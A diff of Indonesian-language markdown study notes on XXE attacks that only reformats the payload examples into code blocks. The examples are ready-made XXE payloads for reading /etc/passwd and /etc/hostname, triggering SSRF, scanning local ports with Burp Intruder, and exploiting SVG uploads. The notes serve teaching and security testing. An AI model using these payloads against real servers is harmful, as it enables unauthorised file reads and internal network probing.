@@ -20,15 +20,23 @@ Sebelum memahami XXE, maka kita harus memiliki pengetahuan dasar XML, DTD dan en
     <!DOCTYPE foo [ <!ENTITY xxe SYSTEM “file:///etc/passwd”> ]>
     ```
   - Exploiting to perform Server Side Request Forgery (SSRF). Sama seperti cara di atas tapi protokol yang digunakan adalah `http` dilanjutkan dengan ip server target
-    > `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “http://1”> ]>`
+    ```
+    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM “http://1”> ]>
+    ```
   - Gunakan `XInclude` jika tidak bisa memodifikasi `!DOCTYPE`. Harap baca SOAP dan XML namespace untuk pemahaman lebih lanjut. 
-    > `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
+    ```
+    <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+    ```
   - Test local machine port (gunakan burp intruder). Brute port dari ip local, lalu cek bergantian `http` dan `https`
-    > `<!DOCTYPE xxe SYSTEM "http://127.0.0.1:§port§/">`
-    > `<!DOCTYPE xxe SYSTEM "https://127.0.0.1:§port§/">`
+    ```
+    <!DOCTYPE xxe SYSTEM "http://127.0.0.1:§port§/">
+    <!DOCTYPE xxe SYSTEM "https://127.0.0.1:§port§/">
+    ```
   - Exploiting [RSS validator](https://taind.wordpress.com/2017/12/25/root-me-xml-external-entity/). jika tidak punya server sendiri untuk upload file XML, gunakan [filebin](https://filebin.net/)
   - Exploiting via file upload. Caranya adalah dengan membuat file SVG yang mengandung exploit xxe
-    > `<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`
+    ```
+    <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+    ```
   - Modifikasi `content-type` pada POST request header.  Ketika respons adalah `200 OK` dan menghasilkan nilai yang sama, maka kita bisa menyelipkan payload pada requesnya
       ```
       POST /action HTTP/1.0
